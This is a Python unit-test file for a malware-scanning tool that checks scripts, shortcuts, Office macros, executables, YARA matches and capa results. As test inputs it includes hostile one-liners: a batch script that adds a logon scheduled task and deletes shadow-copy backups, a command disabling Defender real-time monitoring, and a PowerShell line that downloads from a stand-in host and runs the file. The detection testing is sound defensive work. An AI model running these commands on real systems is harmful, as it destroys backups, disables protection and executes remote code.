"""Layer 2: scripts and shortcuts, Office macros, program checks, YARA and capa."""

import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest import mock

from blotter import config, hashing
from blotter.analyze import filetype as ft
from blotter.analyze import office, program, scripts, yararules
from blotter.checks import capabilities, macros, yara_rules
from blotter.checks import program as program_check
from blotter.checks import scripts as scripts_check
from blotter.findings import (CLEAR, ERROR, HIDING, MALICIOUS, NOTE, PACKED, RISKY, SIGNED, SKIPPED, SUSPICIOUS,
                              UNCHECKED, UNSIGNED, WEAK)
from tests import samples

TEXT = ft.FileType("text", "a text file", "text", {})


def abilities(findings):
    return {f.details.get("ability") for f in findings}


def write(data: bytes) -> Path:
    path = Path(tempfile.mkdtemp()) / "sample.blotter"
    path.write_bytes(data)
    return path


class ScriptTests(unittest.TestCase):
    def test_obfuscated_powershell(self):
        found = scripts_check.judge(TEXT, "hello.ps1", samples.obfuscated_ps1())
        self.assertTrue({"download-run", "encoded-command", "hidden-window", "obfuscation"} <= abilities(found),
                        abilities(found))
        self.assertTrue(any(RISKY in f.signals for f in found))
        self.assertTrue(any(HIDING in f.signals for f in found))

    def test_plain_script_is_clear(self):
        found = scripts_check.judge(TEXT, "list.ps1", samples.plain_ps1())
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_not_a_script(self):
        self.assertEqual(scripts_check.judge(TEXT, "notes.txt", b"hello")[0].level, SKIPPED)

    def test_batch_and_vbs_tricks(self):
        bat = b"@echo off\r\nschtasks /create /tn upd /tr c:\\x.exe /sc onlogon\r\nvssadmin delete shadows /all /quiet\r\n"
        found = scripts_check.judge(TEXT, "fix.bat", bat)
        self.assertTrue({"persistence", "delete-backups"} <= abilities(found))
        vbs = b'Set s = CreateObject("WScript.Shell")\r\nExecute(StrReverse("""olleh"" xobgsm"))\r\n'
        self.assertIn("obfuscation", abilities(scripts_check.judge(TEXT, "a.vbs", vbs)))

    def test_defender_tamper(self):
        found = scripts_check.judge(TEXT, "boost.ps1", b"Set-MpPreference -DisableRealtimeMonitoring $true\r\n")
        tamper = [f for f in found if f.details.get("ability") == "defender-tamper"]
        self.assertEqual(set(tamper[0].signals), {RISKY, HIDING})

    def test_utf16_script(self):
        data = "\ufeffInvoke-WebRequest https://x.invalid/a -OutFile a.exe; Start-Process a.exe".encode("utf-16-le")
        self.assertIn("download-run", abilities(scripts_check.judge(TEXT, "a.ps1", data)))

    def test_hta_and_encoded_vbe(self):
        self.assertIn("hta", abilities(scripts_check.judge(TEXT, "x.hta", b"<html><hta:application/></html>")))
        self.assertIn("encoded-script", abilities(scripts_check.judge(TEXT, "x.vbe", b"#@~^XXXX==")))

    def test_shortcut_parsing(self):
        lnk = scripts.parse_lnk(samples.lnk())
        self.assertTrue(lnk["target"].endswith("powershell.exe"))
        self.assertIn("iwr", lnk["arguments"])
        self.assertTrue(lnk["minimized"])

    def test_shortcut_that_runs_a_command(self):
        found = scripts_check.judge(ft.FileType("shortcut", "", "lnk", {}), "photo.lnk", samples.lnk())
        self.assertTrue({"lnk-command", "hidden-window", "download-run"} <= abilities(found), abilities(found))

    def test_plain_shortcut(self):
        plain = samples.lnk(target=r"..\Program Files\Game\game.exe", arguments="", minimized=False)
        found = scripts_check.judge(ft.FileType("shortcut", "", "lnk", {}), "Game.lnk", plain)
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_scan_reads_the_real_name(self):
        path = write(b"Start-Process calc -WindowStyle Hidden\r\n")
        hashing.remember(path, "0" * 64, "go.ps1")
        try:
            self.assertIn("hidden-window", abilities(scripts_check.scan(path)))
        finally:
            hashing.forget(path)


class OfficeTests(unittest.TestCase):
    def test_auto_run_macro(self):
        found = office.analyze("macros", ft.FileType("document", "", "ooxml", {}), samples.docm())
        self.assertEqual(abilities(found), {"macro-autorun"})
        self.assertIn("AutoOpen", found[0].text)
        self.assertEqual(found[0].signals, [RISKY])

    def test_auto_run_that_runs_programs_is_suspicious(self):
        source = samples.MACRO.replace('MsgBox "Hello from a harmless Blotter test macro."', 'Shell "notepad.exe"')
        found = office.analyze("macros", ft.FileType("document", "", "ooxml", {}), samples.docm(source))
        self.assertEqual(found[0].level, SUSPICIOUS)
        self.assertEqual(found[0].details["ability"], "macro-autorun-exec")

    def test_no_macros(self):
        doc = samples.zip_of({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>"})
        found = office.analyze("macros", ft.FileType("document", "", "ooxml", {}), doc)
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_remote_template(self):
        found = office.analyze("macros", ft.FileType("document", "", "ooxml", {}), samples.remote_template_docx())
        self.assertIn("remote-template", abilities(found))

    def test_check_skips_other_files(self):
        self.assertEqual(macros.scan(write(b"%PDF-1.4"))[0].level, SKIPPED)
        self.assertIn("macro-autorun", abilities(macros.scan(write(samples.docm()))))


def fake_pe(sections, imports, dotnet=False):
    secs = [types.SimpleNamespace(Name=name.encode().ljust(8, b"\0"), get_data=lambda d=data: d,
                                  Characteristics=0x20000000) for name, data in sections]
    entry = types.SimpleNamespace(dll=b"KERNEL32.dll",
                                  imports=[types.SimpleNamespace(name=n.encode()) for n in imports])
    dirs = [types.SimpleNamespace(VirtualAddress=0) for _ in range(16)]
    dirs[14].VirtualAddress = 0x2000 if dotnet else 0
    return types.SimpleNamespace(parse_data_directories=lambda **k: None, DIRECTORY_ENTRY_IMPORT=[entry],
                                 sections=secs, OPTIONAL_HEADER=types.SimpleNamespace(DATA_DIRECTORY=dirs),
                                 close=lambda: None)


class ProgramTests(unittest.TestCase):
    def run_fake(self, pe, signature=None):
        with mock.patch("pefile.PE", return_value=pe), \
             mock.patch.object(program, "signature", return_value=signature or {"status": "NotSigned", "signer": ""}):
            return program.analyze("program", "x.exe")

    def test_injection_imports(self):
        pe = fake_pe([(".text", b"\x90" * 1000)], ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"])
        found = self.run_fake(pe)
        self.assertIn("inject", abilities(found))
        self.assertIn("Cheats, mod loaders", next(f.text for f in found if f.details.get("ability") == "inject"))

    def test_packed(self):
        import random
        noise = random.Random(1).randbytes(200_000)
        found = self.run_fake(fake_pe([("UPX0", b""), ("UPX1", noise)], ["LoadLibraryA", "GetProcAddress"]))
        packed = [f for f in found if PACKED in f.signals]
        self.assertIn("UPX", packed[0].text)

    def test_dotnet_resources_are_not_packing(self):
        import random
        noise = random.Random(2).randbytes(200_000)
        found = self.run_fake(fake_pe([(".text", noise)], ["_CorDllMain"], dotnet=True))
        self.assertFalse(any(PACKED in f.signals for f in found))
        self.assertIn("dotnet-compressed", abilities(f for f in found if f.signals == [WEAK]), "a weak sign, kept")

    def test_broken_signature_is_suspicious(self):
        found = self.run_fake(fake_pe([(".text", b"\x90")], ["ExitProcess"]), {"status": "HashMismatch", "signer": "X"})
        self.assertEqual(found[0].level, SUSPICIOUS)

    def test_unsigned_is_marked(self):
        found = self.run_fake(fake_pe([(".text", b"\x90")], ["ExitProcess"]))
        self.assertEqual(found[0].signals, [UNSIGNED])

    def test_valid_signature(self):
        found = self.run_fake(fake_pe([(".text", b"\x90")], ["ExitProcess"]),
                              {"status": "Valid", "signer": "Example Corp", "kind": "Authenticode"})
        self.assertEqual(found[0].signals, [SIGNED])
        self.assertIn("Example Corp", found[0].text)

    def test_real_signed_program(self):
        """Python's own python.exe is signed by the Python Software Foundation (asks Windows for real)."""
        from blotter.checks import signature as signature_check
        exe = Path(sys.base_prefix) / "python.exe"
        found = signature_check.scan(exe)
        self.assertTrue(any(SIGNED in f.signals for f in found), [f.text for f in found])
        self.assertIn("Python Software Foundation", found[0].text)

    def test_broken_program(self):
        found = program.analyze("program", write(samples.minimal_pe()), check_signature=False)
        self.assertIn(found[0].level, (NOTE, CLEAR))

    def test_not_a_program(self):
        self.assertEqual(program_check.scan(write(b"%PDF-1.4"))[0].level, SKIPPED)


def fake_match(rule, namespace="forge", **meta):
    return types.SimpleNamespace(rule=rule, namespace=namespace, meta=meta)


class YaraTests(unittest.TestCase):
    def test_eicar_in_memory_with_our_rule(self):
        rules = yararules.load()  # the test folder has no YARA Forge rules: only ours
        found = yararules.scan_target(rules, "yara", data=samples.eicar())
        self.assertEqual(found[0].level, MALICIOUS)
        self.assertIn("EICAR", found[0].text)

    def test_nothing_matches_ordinary_bytes(self):
        found = yara_rules.scan(write(b"just a normal text file\r\n"))
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_compiled_rules_are_reused(self):
        yararules.load()
        stamp = config.YARA_COMPILED.stat().st_mtime_ns
        yararules.load()
        self.assertEqual(config.YARA_COMPILED.stat().st_mtime_ns, stamp)

    def test_forge_categories(self):
        c = yararules.classify
        self.assertEqual(c("y", fake_match("ELASTIC_Windows_Trojan_Agenttesla_1", score=75)).level, MALICIOUS)
        self.assertEqual(c("y", fake_match("SIGNATURE_BASE_HKTL_Mimikatz", score=75)).signals, [RISKY])
        self.assertEqual(c("y", fake_match("DITEKSHEN_INDICATOR_EXE_Packed_VMProtect", score=70)).signals, [HIDING])
        self.assertEqual(c("y", fake_match("MALPEDIA_Win_Something_Auto", score=75)).level, SUSPICIOUS)
        self.assertEqual(c("y", fake_match("SOME_Mal_Thing", score=60)).level, SUSPICIOUS)
        self.assertEqual(c("y", fake_match("TRELLIX_ARC_Malw_Eicar", score=75)).level, MALICIOUS)

    def test_own_rule_levels(self):
        m = fake_match("Mine", namespace="own_test", blotter="risky", text="It does a thing.")
        f = yararules.classify("y", m)
        self.assertEqual((f.signals, f.text), ([RISKY], "It does a thing."))


CAPA_RESULT = {"rules": {
    "inject DLL reflectively": {"meta": {"namespace": "load-code/pe"}},
    "write process memory": {"meta": {"namespace": "host-interaction/process/inject"}},
    "check for debugger via API": {"meta": {"namespace": "anti-analysis/anti-debugging/debugger-detection"}},
    "persist via Run registry key": {"meta": {"namespace": "persistence/registry/run"}},
    "read file on Windows": {"meta": {"namespace": "host-interaction/file-system/read"}},
    "match known PlugX module": {"meta": {"namespace": "malware-family/plugx"}},
    "some library rule": {"meta": {"namespace": "host-interaction/process/inject", "lib": True}},
}}


class CapaTests(unittest.TestCase):
    def test_interpret(self):
        found = capabilities.interpret(CAPA_RESULT)
        self.assertTrue({"inject", "anti-analysis", "persistence"} <= abilities(found), abilities(found))
        self.assertEqual(sum(1 for f in found if f.details.get("ability") == "inject"), 1, "said once")
        self.assertTrue(any(f.level == SUSPICIOUS and "plugx" in f.text for f in found))

    def test_broad_rules_are_not_risky(self):
        ordinary = {"rules": {
            "allocate or change RWX memory": {"meta": {"namespace": "host-interaction/process/inject"}},
            "parse credit card information": {"meta": {"namespace": "collection/credit-card"}},
            "interact with driver via IOCTL": {"meta": {"namespace": "host-interaction/driver"}},
            "load assembly via IAssembly": {"meta": {"namespace": "load-code/dotnet"}},
        }}
        found = capabilities.interpret(ordinary)
        self.assertFalse(any(RISKY in f.signals for f in found), "these are only weak signs")
        weak_ones = [f for f in found if f.signals == [WEAK]]
        self.assertEqual({f.details["ability"] for f in weak_ones},
                         {"memory", "card-numbers", "device", "load-assembly"}, "downweighted, not dropped")
        self.assertEqual(found[-1].level, CLEAR)
        real = {"rules": {"install driver": {"meta": {"namespace": "host-interaction/driver"}}}}
        self.assertEqual(abilities(capabilities.interpret(real)), {"driver"})

    def test_ordinary_program(self):
        found = capabilities.interpret({"rules": {"read file on Windows": {"meta": {"namespace": "host-interaction/file-system/read"}}}})
        self.assertEqual([f.level for f in found], [CLEAR])

    def test_needs_rules_and_a_program(self):
        self.assertEqual(capabilities.scan(write(b"%PDF-1.4"))[0].level, SKIPPED)
        with mock.patch.object(config, "CAPA_RULES", Path(tempfile.mkdtemp()) / "missing"):
            self.assertEqual(capabilities.scan(Path(sys.base_prefix) / "python.exe")[0].level, ERROR)

    def test_command_reads_no_user_settings(self):
        cmd = capabilities.command("x.blotter")
        self.assertEqual(cmd[1:4], ["-I", "-B", "-c"])
        self.assertIn("run_module('capa.main'", cmd[4])
        self.assertIn("-j", cmd)


if __name__ == "__main__":
    unittest.main()
